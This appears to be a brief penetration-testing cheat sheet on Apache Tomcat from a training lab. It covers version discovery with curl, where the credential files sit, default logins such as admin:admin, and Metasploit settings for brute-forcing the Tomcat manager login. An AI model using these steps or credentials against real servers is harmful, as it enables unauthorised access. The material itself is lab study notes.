# tomcat

## Discovery

```shell
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```


## Important Files

**conf/tomcat-users.xml**

The tomcat-users.xml file stores user credentials and their assigned roles.

**webapps/customapp/WEB-INF/web.xml**

This file stores information about the routes used by the application and the classes handling these routes.

## Default Credentials

admin:admin
tomcat:tomcat

## Attacks

### Login Bruteforce

Metaspoilt as a login bruteforce

```
auxiliary/scanner/http/tomcat_mgr_login

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```
